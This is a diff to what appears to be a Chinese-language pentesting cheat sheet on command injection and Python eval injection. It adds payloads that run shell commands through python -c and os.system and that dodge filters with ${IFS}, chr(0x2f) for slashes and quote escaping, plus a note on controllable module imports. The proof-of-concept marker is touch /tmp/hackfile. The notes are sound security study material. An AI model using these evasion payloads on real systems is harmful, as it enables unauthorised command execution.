@@ -572,6 +572,11 @@ public interface UserMapper {
     1. `/`:
         1. 在环境中截取, 如当前路径: `xxx;cc=$(pwd);ff=${cc:0:1};mkdir $(ff)tmp$(ff)hackfile;`
         1. 调用python库函数: `x;python${IFS}-c${IFS}\"getattr(__import__('os'),'system')('touch\"'${IFS}'\"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')\";1.tar.gz`
+            1. 调用python命令行执行python脚本：`python -c "print('abc')"` 或 `python -c "print('ab""cd')"` 或 `python -c "print('ab"''"cd')"` 或 `python -c "print('ab"'xxx'"cd')"`
+            2. python脚本执行shell命令：`python -c "__import__('os').system('touch /tmp/hackfile')"` 或 `python -c "getattr(__import__('os'),'system')('touch /tmp/hackfile')"`
+            3. 替换空格：`python${IFS}-c${IFS}"getattr(__import__('os'),'system')('touch"'${IFS}'"/tmp/hackfile')"`
+            4. 替换斜杠：`python${IFS}-c${IFS}"getattr(__import__('os'),'system')('touch"'${IFS}'"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')"`
+            5. 在请求中将双引号反转义：`python${IFS}-c${IFS}\"getattr(__import__('os'),'system')('touch\"'${IFS}'\"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')\"`
 
     1. 空格: 使用特殊变量替换: `$ a=$(curl$IFS"http://10.74.201.219:8888/")`
     1. `;`: 使用十六进制替换: `a=$'\x3b'; echo $a`, 这种方式会被当做字符串来执行
@@ -684,7 +689,8 @@ public class OSi {
 
 #### Python
 
-调用`eval()`, 验证POC: `__import__(%27os%27).system(%27touch%20/tmp/hackkk.sh%27)`
+1. 调用`eval()`, 验证POC: `__import__(%27os%27).system(%27touch%20/tmp/hackkk.sh%27)`
+1. 自定义模块路径`sys.path.append("xxx")`可控, 导入模块名称`__import__("xxx")`可控
 
 ##### 格式化字符串漏洞
 
